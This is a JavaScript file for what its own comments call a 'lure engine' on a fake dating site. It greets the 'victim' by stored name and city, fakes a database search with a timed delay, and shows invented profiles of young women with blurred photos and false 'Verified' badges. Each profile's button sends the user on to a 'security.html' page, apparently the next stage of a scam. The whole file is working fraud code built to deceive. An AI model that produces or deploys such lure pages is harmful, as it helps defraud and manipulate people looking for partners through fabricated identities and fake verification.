/**
 * PUREMATCH DYNAMIC LURE ENGINE
 * Logic: Pulls images and injects localized content
 */

window.onload = function() {
    // 1. Get the user's data we saved on the first page
    const victimName = sessionStorage.getItem('userName') || "Guest";
    const victimCity = sessionStorage.getItem('userCity') || "your area";

    // 2. Update the status text while "searching"
    const statusText = document.getElementById('status-text');
    if(statusText) {
        statusText.innerHTML = `Finding verified partners in <strong>${victimCity}</strong> for <strong>${victimName}</strong>...`;
    }

    // 3. Wait 3.5 seconds to make it look like a real database search
    setTimeout(() => {
        displayMatches(victimCity);
    }, 3500); 
};

function displayMatches(city) {
    const matchGrid = document.getElementById('match-grid');
    const loader = document.getElementById('loader-container');
    const results = document.getElementById('results-container');

    // These are the "Lures" - they link to your p1.jpg, p2.jpg, p3.jpg
    const fakeMatches = [
        { name: "Sarah", age: 24, img: "p1.jpg", bio: "New in " + city },
        { name: "Jessica", age: 22, img: "p2.jpg", bio: "Looking for someone in " + city },
        { name: "Amanda", age: 27, img: "p3.jpg", bio: "Active now near " + city }
    ];

    // Hide the spinner and show the results
    if(loader) loader.style.display = 'none';
    if(results) results.style.display = 'block';
    
    // Ensure the grid is visible and styled
    if(matchGrid) {
        matchGrid.style.display = 'grid';
        matchGrid.style.gridTemplateColumns = 'repeat(auto-fit, minmax(250px, 1fr))';
        matchGrid.style.gap = '20px';
        matchGrid.innerHTML = ''; // Clear the "Searching" text

        // Loop through each match and build the profile card
        fakeMatches.forEach(girl => {
            matchGrid.innerHTML += `
                <div style="background:white; border-radius:15px; overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,0.1); text-align:left; color:#333;">
                    <div style="position:relative;">
                        <img src="${girl.img}" onerror="this.src='https://via.placeholder.com/300x400?text=Profile+Photo'" style="width:100%; height:300px; object-fit:cover; filter:blur(4px);">
                        <div style="position:absolute; top:10px; right:10px; background:#4ade80; color:white; padding:5px 10px; border-radius:20px; font-size:12px; font-weight:bold;">✓ Verified</div>
                    </div>
                    <div style="padding:15px;">
                        <h3 style="margin:0; font-size:1.2rem;">${girl.name}, ${girl.age}</h3>
                        <p style="color:#666; font-size:14px; margin:5px 0 15px 0;">${girl.bio}</p>
                        <button onclick="window.location.href='security.html'" style="width:100%; background:#ff4b2b; color:white; border:none; padding:12px; border-radius:10px; font-weight:600; cursor:pointer;">Message Now</button>
                    </div>
                </div>`;
        });
    }
}
